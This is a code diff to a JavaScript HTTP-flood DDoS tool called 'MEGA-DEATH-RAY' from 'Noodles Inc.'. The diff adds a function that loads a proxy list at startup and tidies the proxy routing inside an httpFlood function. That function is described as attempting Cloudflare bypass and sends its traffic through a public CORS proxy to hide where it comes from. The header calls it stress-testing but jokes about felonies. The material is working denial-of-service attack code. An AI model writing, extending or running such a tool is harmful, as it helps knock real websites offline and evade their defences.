@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v8.0)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v9.0)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your choices.
 // ALL activities are logged in high-definition.
@@ -200,6 +200,23 @@ function updateProxies() {
     logAction(`Proxy list updated with ${proxies.length} proxies.`);
 }
 
+// Load proxy list from public/main/proxies.js
+async function loadProxies() {
+    try {
+        const response = await fetch('/public/main/proxies.js');
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        const proxyData = await response.json();
+        proxies = proxyData.proxies; // Assuming the JSON has a "proxies" array
+        logAction(`Loaded ${proxies.length} proxies from public/main/proxies.js`);
+    } catch (error) {
+        console.error('Noodles Inc: Error loading proxies:', error);
+        logAction(`Error loading proxies: ${error}`);
+        alert('Noodles Inc: Failed to load proxies. Check console for details.');
+    }
+}
+
 // Enhanced httpFlood function with improved error handling and Cloudflare bypass attempts
 async function httpFlood(url, hexBytes, proxy) {
     const randomString = Math.random().toString(36).substring(2, 15);
@@ -239,13 +256,15 @@ async function httpFlood(url, hexBytes, proxy) {
             redirect: 'follow', // Follow redirects
             signal: controller.signal,
         };
-    //Proxy Integration with CORSproxy
+
+        // Proxy Integration with CORSproxy
         if (proxy) {
             const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(proxy)}`;
             fetchOptions.proxy = proxyUrl;
             console.log(`Using proxy: ${proxy} through CORSproxy`);
             logAction(`Using proxy: ${proxy} through CORSproxy`);
         }
+
         const response = await fetch(url, fetchOptions);
 
         clearTimeout(timeoutId);
@@ -663,3 +682,6 @@ document.getElementById('decryptFile').addEventListener('click', async () => {
     };
     reader.readAsText(fileToEncrypt);
 });
+
+// Initialize Proxies
+loadProxies();
